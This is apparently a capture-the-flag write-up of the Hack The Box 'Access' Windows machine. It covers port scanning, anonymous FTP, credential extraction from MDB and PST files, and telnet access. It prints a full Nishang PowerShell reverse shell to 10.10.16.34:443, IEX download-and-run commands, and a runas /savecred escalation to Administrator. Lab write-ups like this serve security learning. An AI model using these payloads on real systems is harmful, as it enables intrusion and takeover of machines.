---
Primary_category: "[[EASY]]"
title: ACADEMY
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags: 
cssclasses:
---

###### PRIMARY CATEGORY → [[EASY]]

#### Summary

- ***FTP Enumeration (Anonymous Login)***
- ***Microsoft Accces Database Enumeration (MDB)***
- ***Microsoft Personal Storage Table Enumeration (PST)***
- ***Telnet Enumeration (System User Login)***
- ***Stored Credentials Enumeration***
- ***Local File Shortcuts Enumeration (LNK)***
- ***Privesc via Runas.exe Windows Command***

![[ACCESS-20241107182702583.webp|400]]

---

#### Setup

Directory creation with the Machine's Name

```bash
mkdir Acess && cd !$
```

Creation of a *Pentesting Folder Structure* to store all the information related to the target

> ***[[ZSH CUSTOM FUNCTIONS#mkt|Reference]]***

```bash title="MACHINE_NAME"
mkt
```

> [!IMPORTANT]- *Tree*
>
> ```bash
> .
> ├── evidence
> │   ├── creds
> │   ├── data
> │   └── screenshots
> ├── logs
> ├── scans
> ├── scope
> └── tools
> ```
>

---

#### Recon

##### *OS Identification*

First, proceed to identify the *Target Operative System*. This can be done by a simple `ping` taking into account the *TTL Unit*

The standard values are →

- ***About 64 → Linux***
- ***About 128 → Windows***

```bash title="Access/scans"
ping -c1 10.129.142.64
```

> [!NOTE]- *Command Output*
>
> ```bash
> PING 10.129.142.64 (10.129.142.64) 56(84) bytes of data.
> 64 bytes from 10.129.142.64: icmp_seq=1 ttl=127 time=45.3 ms
>
> --- 10.129.142.64 ping statistics ---
> 1 packets transmitted, 1 received, 0% packet loss, time 0ms
> rtt min/avg/max/mdev = 45.280/45.280/45.280/0.000 ms
> ```
>

As mentioned, according to the TTL, It seems that It is a ***Windows Target***

##### *Port Scanning*

###### *General Scan*

Let's run a *Nmap* Scan to check what *TCP* Ports are opened in the machine

The Scan result is exported in a grepable format for subsequent *Port Parsing*

```bash title="Access/scans"
nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn -oG allPorts 10.129.142.64
```

> [!NOTE]- *AllPorts Output*
>
> ```bash title="MACHINE_NAME/scans/AllPorts"
> # Nmap 7.94SVN scan initiated Thu Nov  7 19:05:42 2024 as: nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn -oG allPorts 10.129.142.64
> # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
> Host: 10.129.142.64 ()  Status: Up
> Host: 10.129.142.64 ()  Ports: 21/open/tcp//ftp///, 23/open/tcp//telnet///, 80/open/tcp//http///    Ignored State: filtered (65532)
> # Nmap done at Thu Nov  7 19:06:08 2024 -- 1 IP address (1 host up) scanned in 26.49 seconds 
> ```
>

**Open Ports → 21, 32, 80**

###### *Comprehensive Scan*

The *[[ZSH CUSTOM FUNCTIONS#extractPorts|ExtractPorts]]* utility is used to get a **Readable Summary** of the previous scan and have ***all Open Ports copied to the clipboard***

```bash title="Access/Scans"
extractPorts allPorts
```

> [!NOTES]- *ExtractPorts Output*
>
> ```bash title="Access/scans"
> [+] Extracting information...
>
>     [+] IP Address: 10.129.142.64
>     [+] Open Ports: 21,23,80
>
> [+] Ports Copied to Clipboard
> ```
>

Then, the ***Comprehensive Scan*** is performed to gather the ***Service and Version*** running on each open port and launch a set of ***Nmap Basic Recon Scripts***

Note that this scan is also exported to have evidence at hand

```bash title="Access/Scans"
nmap -p21,23,80 -sCV -oN targeted 10.129.142.64
```

> [!NOTES]- *Targeted Output*
>
> ```bash title="Access/scans/Targeted"
> # Nmap 7.94SVN scan initiated Thu Nov  7 19:13:05 2024 as: nmap -p21,23,80 -sCV -oN targeted 10.129.142.64
> Nmap scan report for 10.129.142.64 (10.129.142.64)
> Host is up (0.064s latency).
>
> PORT   STATE SERVICE VERSION
> 21/tcp open  ftp     Microsoft ftpd
> | ftp-syst:
> |_  SYST: Windows_NT
> | ftp-anon: Anonymous FTP login allowed (FTP code 230)
> |_Can't get directory listing: PASV failed: 425 Cannot open data connection.
> 23/tcp open  telnet?
> 80/tcp open  http    Microsoft IIS httpd 7.5
> |_http-server-header: Microsoft-IIS/7.5
> | http-methods:
> |_  Potentially risky methods: TRACE
> |_http-title: MegaCorp
> Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
>
> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
> # Nmap done at Thu Nov  7 19:16:06 2024 -- 1 IP address (1 host up) scanned in 181.40 seconds
> ```
>

##### *80 - HTTP*

###### *General Information*

- ***Banner Grabbling***

```bash title="Access/scans"
nc -nv 10.129.148.205 80 <<< ""
```

Nothing reported

- ***Server HTTP Response Headers***

```bash title="Access/scans"
curl --silent --request GET --location --head "http://10.129.142.64"
```

> [!NOTE]- *Command Output*
>
> ```bash title="Access/scans"
> HTTP/1.1 200 OK
> Content-Type: text/html
> Last-Modified: Thu, 23 Aug 2018 23:33:43 GMT
> Accept-Ranges: bytes
> ETag: "44a87bb393bd41:0"
> Server: Microsoft-IIS/7.5
> X-Powered-By: ASP.NET
> Date: Thu, 07 Nov 2024 18:24:02 GMT
> Content-Length: 391
> ```
>

According to some of the above headers, we extract the following information →

- ***Web Server → Microsoft IIS***
- ***Server-Side Programming Language → ASP.NET***

Therefore, we can start thinking about using *.ASP* as a valid extension when performing the *Web Resources Enumeration*  via *Gobuster, wfuzz...*

###### *Web Technologies #0*

Let's see the Web Technologies →

```bash title="Access/scans"
whatweb "http://10.129.142.64"
```

> [!NOTES]- *Command Output*
>
> ```bash title="Access/scans"
> http://10.129.142.64 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/7.5], IP[10.129.142.64], Microsoft-IIS[7.5], Title[MegaCorp], X-Powered-By[ASP.NET]
> ```
>

Practically the same information is obtained, *IIS* as *Web Server* and *ASP.NET* as *Server-Side Programming Language*

###### *Nmap Fuzzing*

Before proceeding with _Directory Enumeration_ using _known Fuzzers_, such as `gobuster` or `wfuzz`, run the _Nmap Small Fuzzer_ to get an idea of the available resources

```bash title="Access/scans"
nmap -p80 --script http-enum -oN simpleWebScan 10.129.142.64
```

No results found, let's continue

###### *Web Technologies #1*

Once you access the website through the browser, just check again the *Web Technologies* reported by *Wappalyzer*

They may differ from those reported by *Whatweb*

![[ACCESS-20241107194147563.webp|275]]
> ***Zoom In***

But not in this case, nothing new here

###### *Browser-Based Web Enumeration*

The only thing displayed in the Web is the following image →

![[ACCESS-20241107194449955.webp|400]]
> ***Zoom In***

Nothing interesting is shown in the *HTML Souce Code* either

###### *Web Resources Fuzzing*

Let's check any available resources, let's go first with the directory enumeration using *WFuzz* →

```bash title="Access/scans"
wfuzz -c --hc 404 -t 20 -f fullWebScan -w /usr/share/seclist/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.142.64/FUZZ
```

> [!NOTE]- *Command Output*
>
> ```bash title="Access/scans"
> Target: http://10.129.142.64/FUZZ
> Total requests: 220545
> ==================================================================
> ID    Response   Lines      Word         Chars          Request
> ==================================================================
>
> Total time: 0
> Processed Requests: 156221
> Filtered Requests: 156220
> Requests/sec.: 0
> ```
>

No directory has been found with the above scan, let's try again but specifying some extensions as follows, this time using *gobuster* →

```bash title="Access/scans"
gobuster dir --threads 200 --output fullWebScan --extensions asp,aspx,html --wordlist /usr/share/seclist/Discovery/Web-Content/directory-list-2.3-medium.txt --url http://10.129.142.64
```

> [!NOTE]- *Command Output*
>
> ```bash title="Access/scans"
> /index.html          [38;2;248;248;242mm (Status: 200) [Size: 391]
> /Index.html          [38;2;248;248;242mm (Status: 200) [Size: 391]
> /INDEX.html          [38;2;248;248;242mm (Status: 200) [Size: 391]
> ```
>

Nothing interesting either, let's check the services running on the remaining ports

##### *23 - Telnet*

###### *Banner Grabbling*

```bash title="Access/scans"
nc -nv 10.129.142.64 23 <<< ""
```

> [!NOTE]- *Command Output*
>
> ```bash title="Access/scans"
> (UNKNOWN) [10.129.142.64] 23 (telnet) open
> ```
>

It does not report any relevant information

###### *Nmap Telnet Enumeration*

```bash title="Access/scans"
nmap -p23 -sV --script "*telnet* and safe" -n 10.129.142.64
```

> [!NOTE]- *Command Output*
>
> ```bash title="Access/scans"
> Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-09 07:08 CET
> Nmap scan report for 10.129.142.64
> Host is up (0.047s latency).
>
> PORT   STATE SERVICE VERSION
> 23/tcp open  telnet  Microsoft Windows XP telnetd (no more connections allowed)
> | telnet-encryption:
> |_  Telnet server does not support encryption
> Service Info: OS: Windows XP; CPE: cpe:/o:microsoft:windows_xp
>
> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
> Nmap done: 1 IP address (1 host up) scanned in 70.95 seconds
> ```
>

With the above scan focused in the *Telnet Service*, we extract the *OS Version* running in the *Target* → ***Windows XP***

Furthermore, this *Telnet Server* does not support encryption

Let's try to connect to the *Telnet Server* through the *Telnet Linux client*

```bash title="Access/scans"
telnet 10.129.142.64
```

It seems that a login is required to access via *Telnet* the remote server

We currently have no credentials to try to login, not even a valid set of usernames to try to bruteforce it with `hydra`

Let's move to the next *Port/Service*

##### *21 - FTP*

We have seen in the [[#*Comprehensive Scan*|Nmap Comprehensive Scan]] that *Anonymous Login* is enabled for the externally exposed *FTP Service*

Let's log in as the *anonymous user*

```bash title="Access/scans"
ftp -a 10.129.142.64
```

```bash title="Access/scans"
dir
```

> [!NOTE]- *Command Output*
>
> ```bash title="Access/scans"
> 425 Cannot open data connection.
> 200 PORT command successful.
> 125 Data connection already open; Transfer starting.
> 08-23-18  08:16PM       <DIR\>          Backups
> 08-24-18  09:00PM       <DIR\>          Engineer
> 226 Transfer complete.
> ```
>

Let's try to download these resources to inspect them locally

```bash title="Access/evidence/data"
wget --mirror --no-passive-ftp "ftp://anonymous:@10.129.142.64"
```

```bash title="Access/evidence/data/10.129.142.64"
tree .
```

> [!NOTE]- *Command Output*
>
> ```bash title="Access/evidence/data/10.129.142.64"
> .
> ├── Backups
> │   └── backup.mdb
> └── Engineer
>     └── Access Control.zip
>
> 3 directories, 2 files
> ```
>

We have a *Microsoft Database Access File* and a *ZIP File*

```bash title="Access/evidence/data/10.129.142.64"
7z l -slt Engineer/Access\ Control.zip
```

> [!NOTE]-  *Command Output*
>
> ```bash title="Access/evidence/data/10.129.142.64"
> 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
> p7zip Version 16.02 (locale=en_GB.UTF-8,Utf16=on,HugeFiles=on,64 bits,128 CPUs 13th Gen Intel(R) Core(TM) i7-13700H (B06A2),ASM,AES-NI)
>
> Scanning the drive for archives:
> 1 file, 10870 bytes (11 KiB)
>
> Listing archive: Engineer/Access Control.zip
>
> --
> Path = Engineer/Access Control.zip
> Type = zip
> Physical Size = 10870
>
> ----------
> Path = Access Control.pst
> Folder = -
> Size = 271360
> Packed Size = 10678
> Modified = 2018-08-24 01:13:52
> Created = 2018-08-24 00:44:57
> Accessed = 2018-08-24 00:44:57
> Attributes = A
> Encrypted = +
> Comment =
> CRC = 1D60603C
> Method = AES-256 Deflate
> Host OS = FAT
> Version = 20
> Volume Index = 0
> ```
>

The *ZIP File* contains a *.PST File (Personal Store Table)*

But the *Method* section indicates that It is encrypted with *AES-256 Deflate*

Therefore, if we try to extract it, It will ask for a *password*. As we currently have no password, we cannot crack the hash obtained with `zip2john` using `john`

Let's analyze the *.MDB* file

Note that, on *UNIX Systems*, we can interact with this extension file through the `mdbtools` package

```bash title="Access/evidence/data/10.129.142.64"
apt install -y -- mdbtools
```

Note that this file type contains a certain number of tables, to list them filter by any table that matches the *user* or *password* strings → 

```bash title="Access/evidence/data/10.129.142.64"
mdb-tables -1 ./Backups/backup.mdb | grep -iP -- '(password|user)'
```

> [!NOTE]- *Command Output*
>
> ```bash title="Access/evidence/data/10.129.142.64"
> auth_user
> auth_user_groups
> auth_user_user_permissions
> USER_OF_RUN
> USER_SPEDAY
> UserACMachines
> UserACPrivilege
> USERINFO
> userinfo_attarea
> UsersMachines
> UserUpdates
> USER_TEMP_SCH
> UserUsedSClasses
> OfflinePermitUsers
> TmpPermitUsers
> ```
>

There are quite a few tables that may contain interesting information

To extract all the stored data of these tables, proceed as follows →

```bash title="Access/evidence/data/10.129.142.64"
while IFS= read -r _table; do mdb-export Backups/backup.mdb "$_table" ; done < <( mdb-tables -1 Backups/backup.mdb |& grep -iP -- 'user|password' )
```

> [!NOTE]- *Command Output*
>
> ```bash title="Access/evidence/data/10.129.142.64"
> id,username,password,Status,last_login,RoleID,Remark
> 25,"admin","admin",1,"08/23/18 21:11:47",26,
> 27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
> 28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
> ```
>

The first lines catch our attention, there are *usernames* and their *passwords in plain text*

Remember that there is a *Encrypted ZIP File* inside the directory named *Engineer*

Therefore, we could try to use the *Engineer User's Password* 

- ***Password → access4u@security***

```bash title="Access/evidence/data/10.129.142.64"
7z x Engineer/Access\ Control.zip
```

***And Boom!*** The *ZIP File* has been extracted correctly using the above password

So, let's inspect the *.PST File*

Note that, as with the *.MDB File*, a specific package has to be installed in order to be able to analyze that file. It is called `pst-utils`

```bash title="Access/evidence/data/10.129.142.64"
apt install -y -- pst-utils 
```

Once installed, we can use the `readpst` utility to convert the *.PST* file into a *.MBOX* file, which is readable, i.e. all information is stored in plain text

```bash title="Access/evidence/data/10.129.142.64"
readpst -tea 'Access Control.pst'
```

> [!NOTE]- *Command Output*
>
> ```bash title="Access/evidence/data/10.129.142.64"
> Opening PST file and indexes...
> Processing Folder "Deleted Items"
>       "Access Control" - 2 items done, 0 items skipped.
> ```
>

Now that we have the *.MBOX* file, we can inspect it properly

It has an email message which contains in its body a plain text password for the *Security Account*

> [!DANGER]- *Mail Body*
>
> ```bash title="Access/evidence/data/10.129.142.64" /4Cc3ssC0ntr0ller/
> Hi there,
>
> The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
>
> Regards,
>
> John
> ```
>

***Password → 4Cc3ssC0ntr0ller***

The *Security* account may be a System one, now we can try to connect to the *Telnet Server* using these credentials

```bash title
telnet 10.129.142.64
```

***And Boom!*** We are connected via *Telnet* in the *Target System*

---

#### Shell as System User

##### *Powershell via IEX*

Due to the *Telnet Session* instability and slowness, let's proceed to establish another connection but, this time, from the *Target* through a *Reverse Shell*

To do so, we have to transfer the *Reverse Shell Payload* to the *Target*

We are gonna use a ***[Nishang Reverse Shell](https://github.com/samratashok/nishang/tree/master/Shells)***

Therefore, download it from the attacker and set up a *Python Simple HTTP Web Server* to share this resource

```bash title="Access/tools"
wget -O reverse.ps1 "https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcpOneLine.ps1"
```

Modify the content of the *Payload* to set the *Attacker IP Address* and a *Listening Port* to receive the *Reverse Shell*

> [!DANGER]- *Reverse.ps1*
>
> ```powershell title="Access/tools" /10.10.16.34/ /443/
> $client = New-Object System.Net.Sockets.TCPClient('10.10.16.34',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
> ```
>

Set up the *Web Server*

```bash title="Access/tools"
python3 -m http.server 8888
```

Set up a *Listener Socket* with the *IP Address* and *Port* specified in the above *Payload*

```bash title="Access/tools"
rlwrap nc -nvlp 443
```

Then, download the resource from the *Target* and execute the *Payload* as follows →

```powershell title="Target"
start /b "" powershell.exe -Exec Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.34:8888/reverse.ps1')
``` 

Now we have a stable connection between the *Target* and the *Attacker*

---

#### Privesc #1

***Initial Non-Privileged User → Security***

Let's see if we can obtains the *user.txt* flag

```powershell title="Target"
Get-Content -Path C:\Users\Security\Desktop\user.txt
```

Just report it and continue, we have to get *Admin* Access 😁

##### *Stored Credentials*

Let's check if there are any credentials saved in the *Windows Credentials Manager*

```powershell title="Target"
cmdkey.exe /list
```

> [!NOTE]- *Command Output*
>
> ```powershell title="Target"
> Currently stored credentials:
>
>     Target: Domain:interactive=ACCESS\Administrator
>     Type: Domain Password
>     User: ACCESS\Administrator
> ```
>

The credentials related to the *ACCESS\Administrator* User are stored, which means that we can execute any command as that user using the `runas.exe` Windows Tool

Note that, `runas.exe` is often used within local file shortcuts to run the binary related to that shorcut as another user, in this case, the one whose credentials has been saved

Therefore, before switching to the *Administrator User Account*, let's list the *.LNK* files on the system that contain a *runas* command

```powershell title="Target"
Get-ChildItem -Path "C:\" -Recurse -Force -Filter *.lnk | % { $Match = Get-Content -Path $_.FullName | Select-String -Pattern '.*runas.*' ; if ($Match){ Write-Output "`nFile: $($_.FullName)`n`n $($Match)" } }
```

![[ACCESS-20241109103201025.webp|350]]
> ***Zoom In***

There it is, a *ZKAccess* executable has been configured to be runned as *ACCESS\Administrator* through the `C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk` file shortcut

##### *Runas Command*

Let's stablish another *Reverse Connection* but this time as the *ACCESS\Administrator* user

Repeat the same process as before, set a *Web Server* to share the downloaded *Reverse Shell* resource and set a *Listener Socket*

Once the above is done, just run the following command in the *Target*

```powershell title="Target"
runas.exe /user:ACCESS\Administrator /savecred "powershell.exe -Exec Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.34:8888/reverse.ps1')"
```

***And Boom!*** we are logged now as the *Adminstrator User*

Therefore, we can obtain the *root.txt* flag →

```powershell title="Target"
Get-Content -Path C:\Users\Administrator\Desktop\root.txt
```

Just report it, and, that's all! 😊